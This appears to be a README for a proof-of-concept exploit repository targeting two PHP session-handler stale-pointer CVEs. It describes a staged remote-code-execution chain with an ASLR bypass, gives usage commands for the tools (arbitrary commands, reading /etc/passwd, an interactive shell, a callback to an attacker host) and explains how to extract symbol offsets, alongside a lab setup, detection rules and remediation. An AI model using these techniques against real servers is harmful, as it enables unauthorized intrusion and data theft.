# php2shell - CVE-2026-109618 / CVE-2026-109619 PoC

**Remote Code Execution via PHP Session Handler Stale Pointer**

I take no credit for the creation of these POCs. Just thought it would be good to have them in one place.

Two critical vulnerabilities in PHP's session upload progress handler allow unauthenticated remote code execution against stock Apache + mod_php deployments. No application-level vulnerability (LFI, file upload, deserialization) is required -- just a reachable `index.php`.

| | |
|---|---|
| **CVE-2026-109618** | `post_bytes_processed` stale pointer -- hash-table insertion increments counters before allocation completes; OOM during `php_url_encode()` in `END` cleanup leaves an uninitialized bucket that `php_session_flush()` treats as a valid `zend_string` |
| **CVE-2026-109619** | `current_file_bytes_processed` stale pointer -- worker-wide `PS()` fields point to freed per-request memory; a subsequent request follows the stale pointer before re-initialization |
| **CVSS v4** | **9.2 Critical** (both) |
| **Disclosed** | 2026-10-21 |
| **Affected** | PHP 8.2 < 8.2.35, 8.3 < 8.3.36, 8.4 < 8.4.27, 8.5 < 8.5.12 |
| **Fixed in** | PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12 |
| **Vector** | Network / No authentication / No user interaction |

## How it works

The exploit chain (implemented in `phppoc2.py`) works against **production-default** PHP + Apache prefork:

```
Stage 0  Worker pinning
         Hold 149 incomplete POST bodies to saturate the prefork pool.
         All subsequent exploit requests land on the same child process.

Stage A1 Trigger OOM via nested multipart
         860 depth-64 nested file upload fields + 4000-byte PHP_SESSION_UPLOAD_PROGRESS
         -> php_url_encode() exhausts memory_limit (128M) during END cleanup
         -> PS(id) and PS(mod_data) left dangling, send_cookie=1

Stage B1 Heap leak (OOB read)
         Stale PS(id) now overlaps a reallocated zend_string with len=0xC8000
         -> Set-Cookie: PHPSESSID= encodes ~800KB of raw heap
         -> Extract zval_ptr_dtor address (from HashTable pDestructor)
         -> Calculate libphp.so base address via known symbol offset

Stage A2 Cheap OOM to free PS(hash_serialize_verifier)
         Second OOM leaves hash_serialize_verifier as dangling pointer

Stage B2 Hijack pDestructor -> system()
         Overwrite freed region with fake zval whose pDestructor = zif_system
         -> When HashTable cleanup calls pDestructor, it executes system(cmd)
         -> RCE as www-data
```

**Key bypass**: Chunked Transfer-Encoding bypasses `post_max_size` -- no `Content-Length` header means `content_length=0`, so `rfc1867_post_handler`'s size check is skipped entirely. This allows delivery of the oversized multipart payload needed to trigger OOM.

## Tools

### phppoc2.py -- Full chain RCE (no LFI required)

The real exploit. Uses the stale pointer vulnerabilities to achieve unauthenticated RCE against stock PHP + Apache. Works on production-default configurations (display_errors=Off, memory_limit=128M, MaxRequestWorkers=150).

**Currently calibrated for PHP 8.4.26 on Debian 13 (trixie)** -- see [Multi-version support](#multi-version-support) for other versions.

```bash
# Basic usage -- default target is 127.0.0.1
python3 phppoc2.py --port 18110

# Run a custom command
python3 phppoc2.py --port 18110 --cmd 'id; uname -a; whoami'

# Write output to proof file
printf 'id; uname -a; whoami; cat /etc/passwd\n' > out/c
python3 phppoc2.py --port 18110 --cmd 'sh</out/c'
cat out/p1

# Re-run against fresh ASLR (restarts container)
python3 phppoc2.py --port 18110 --restart p2s-pure-18110

# Specify architecture (auto-detected by default)
python3 phppoc2.py --port 18110 --arch aarch64
```

**Options:**

| Flag | Default | Description |
|---|---|---|
| `--port` | 18110 | Target port |
| `--cmd` | `id>/out/p1` | Command to execute |
| `--proof` | `out/p1` | File to check for RCE proof |
| `--arch` | auto | Architecture (`x86_64` / `aarch64`) |
| `--workers` | 150 | Worker count (match `MaxRequestWorkers`) |
| `--retries` | 3 | Retry attempts for each stage |
| `--restart` | - | Container name to restart between attempts |

### phpexploit.py -- Session poisoning + LFI

Alternative approach using `PHP_SESSION_UPLOAD_PROGRESS` session poisoning combined with Local File Inclusion. Requires an LFI vector on the target (file include, `page=` parameter, etc).

```bash
# Session poison + auto-detected LFI
python3 phpexploit.py http://target.example.com/index.php "id"

# Specify LFI parameter name
python3 phpexploit.py http://target.example.com/ "id" --lfi-param page

# Interactive shell mode
python3 phpexploit.py http://target.example.com/ "id" -i

# Blind callback (no LFI needed on target side)
python3 phpexploit.py http://target.example.com/ "id" --callback http://attacker.com/
```

## Lab setup

Spin up a vulnerable target using the official PHP Docker image (stock production config):

```bash
# Create minimal webroot
mkdir -p www out
echo '<?php echo "OK\n"; ?>' > www/index.php

# Launch PHP 8.4.26 with production defaults
docker run -d \
    --name p2s-pure-18110 \
    -p 127.0.0.1:18110:80 \
    -v "$PWD/www:/var/www/html:ro" \
    -v "$PWD/out:/out" \
    php:8.4.26-apache \
    /bin/sh -c 'cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini; \
                chown -R www-data:www-data /out; \
                exec apache2-foreground'

# Verify it's running
curl http://127.0.0.1:18110/index.php
# -> OK

# Fire the exploit
python3 phppoc2.py --port 18110

# Check proof
cat out/p1
# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Cleanup
docker rm -f p2s-pure-18110
```

## Multi-version support

The exploit offsets (`zval_ptr_dtor`, `zif_system`) are build-specific -- they change with every PHP rebuild. The default profile in `phppoc2.py` targets **PHP 8.4.26 x86_64 on Debian 13 trixie** (the stock `php:8.4.26-apache` Docker image).

For other vulnerable versions, you need to extract the correct symbol offsets from that build's `libphp.so`:

```bash
# Inside a container of the target version:
readelf -Ws /usr/local/lib/apache2/modules/libphp.so | grep -wE 'zval_ptr_dtor|zif_system'

# Example output (PHP 8.4.26 x86_64):
#  5765: 000000000065eb60   123 FUNC  GLOBAL DEFAULT  14 zval_ptr_dtor
#  8832: 0000000000465370    85 FUNC  GLOBAL DEFAULT  14 zif_system
```

**Same minor version** (e.g., 8.4.25 vs 8.4.26) -- only the symbol offsets change. Heap layout constants are typically identical between patch releases.

**Different minor version** (e.g., 8.3.x vs 8.4.x) -- both symbol offsets AND heap geometry constants (`S`, `hsv`, shaping parameters) may differ. If the leak stage (B1) succeeds but RCE (B2) fails, the heap layout needs recalibration for that version.

## Affected versions

| Branch | Vulnerable | Fixed |
|---|---|---|
| PHP 8.2 | 8.2.0 -- 8.2.34 | 8.2.35 |
| PHP 8.3 | 8.3.0 -- 8.3.35 | 8.3.36 |
| PHP 8.4 | 8.4.0 -- 8.4.26 | 8.4.27 |
| PHP 8.5 | 8.5.0 -- 8.5.11 | 8.5.12 |

PHP 8.1 and below are EOL and do not receive patches. If your environment runs these versions, assume vulnerable.

## Detection

### Indicators of Compromise

**Network layer:**
- Burst of 149+ concurrent POST requests from a single source to a single endpoint
- `Transfer-Encoding: chunked` with no `Content-Length` header on POST requests
- Multipart bodies containing `PHP_SESSION_UPLOAD_PROGRESS` field
- `Set-Cookie: PHPSESSID=` response headers > 100KB (heap leak)
- Abnormally large HTTP response bodies on simple endpoints

**Host layer:**
- Apache error log: `Allowed memory size of 134217728 bytes exhausted`
- Apache error log: `child pid XXXXX exit signal Segmentation fault (11)`
- Session files (`sess_*`) > 1MB in `session.save_path` (`/tmp` by default)
- Session files containing binary / non-printable data
- Shell processes (`sh`, `bash`, `dash`) spawned as children of `apache2` / `httpd`
- Unexpected files in `/tmp` or webroot written by `www-data`

### Sigma rule (generic)

```yaml
title: php2shell Session Upload Progress RCE Attempt
id: b7c4d8e0-1234-5678-9abc-def012345678
status: experimental
description: Detects exploitation of CVE-2026-109618/CVE-2026-109619 via session upload progress handler
references:
    - https://github.com/9bie/php2shell-bypass-aslr-exp
logsource:
    category: webserver
    product: apache
detection:
    selection_oom:
        cs-status: 500
        sc-bytes|gt: 100000
    selection_error_log:
        EventData|contains:
            - 'Allowed memory size of'
            - 'bytes exhausted'
    selection_session:
        cs-body|contains: 'PHP_SESSION_UPLOAD_PROGRESS'
    selection_chunked:
        cs-header-transfer-encoding: 'chunked'
        cs-method: 'POST'
    condition: (selection_oom and selection_session) or
               (selection_error_log and selection_session) or
               (selection_chunked and selection_session and selection_oom)
    timeframe: 5m
    count: 10
falsepositives:
    - Legitimate large file uploads with session progress tracking (rare to trigger OOM)
level: high
tags:
    - attack.initial_access
    - attack.t1190
    - cve.2026.109618
    - cve.2026.109619
```

### Suricata (network)

```
alert http any any -> $HOME_NET any (msg:"php2shell - PHP_SESSION_UPLOAD_PROGRESS with chunked TE";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"PHP_SESSION_UPLOAD_PROGRESS"; http_client_body;
    content:"Transfer-Encoding|3a 20|chunked"; http_header;
    threshold:type both, track by_src, count 50, seconds 30;
    classtype:web-application-attack;
    sid:2026100; rev:1;)

alert http $HOME_NET any -> any any (msg:"php2shell - Oversized Set-Cookie PHPSESSID (heap leak)";
    flow:to_client,established;
    content:"Set-Cookie|3a 20|PHPSESSID="; http_header;
    isdataat:100000,relative;
    classtype:web-application-attack;
    sid:2026101; rev:1;)
```

## Remediation

1. **Patch immediately** -- upgrade to PHP 8.2.35, 8.3.36, 8.4.27, or 8.5.12+
2. **If patching is delayed:**
   - Disable `session.upload_progress.enabled` in `php.ini` (set to `0`)
   - Deploy WAF rules blocking `PHP_SESSION_UPLOAD_PROGRESS` in request bodies
   - Rate-limit concurrent POST connections per source IP
   - Monitor Apache error logs for OOM and segfault patterns
3. **Long-term:** consider migrating from mod_php + prefork to PHP-FPM + event MPM (different process model, not vulnerable to this specific worker-pinning technique)

## Requirements

- Python 3.8+
- `requests` library (`pip install requests`)
- Docker (for lab setup only)

## Credits

- **Original research**: [Ahmed Sultan](https://github.com/Syrex1013) ([@0x4148](https://x.com/0x4148)) -- vulnerability discovery and initial exploit
- **Working upstream PoC**: [9bie](https://github.com/9bie/php2shell-bypass-aslr-exp) -- full ASLR bypass chain, chunked TE bypass, production-config exploit
- **Detection rules**: [ikow](https://github.com/ikow/php2shell-poc) -- Sigma, Suricata, and ModSecurity detection rules

## References

- [php.net security advisory](https://www.php.net/ChangeLog-8.php)
- [Rapid7 AttackerKB analysis](https://attackerkb.com/)
- [Datadog threat research](https://securitylabs.datadoghq.com/)
- [9bie exploit writeup (English)](https://github.com/9bie/php2shell-bypass-aslr-exp/blob/main/readme_en.md)

## Disclaimer

This tool is provided for **authorized security testing and research purposes only**. Use it only against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The authors are not responsible for misuse.
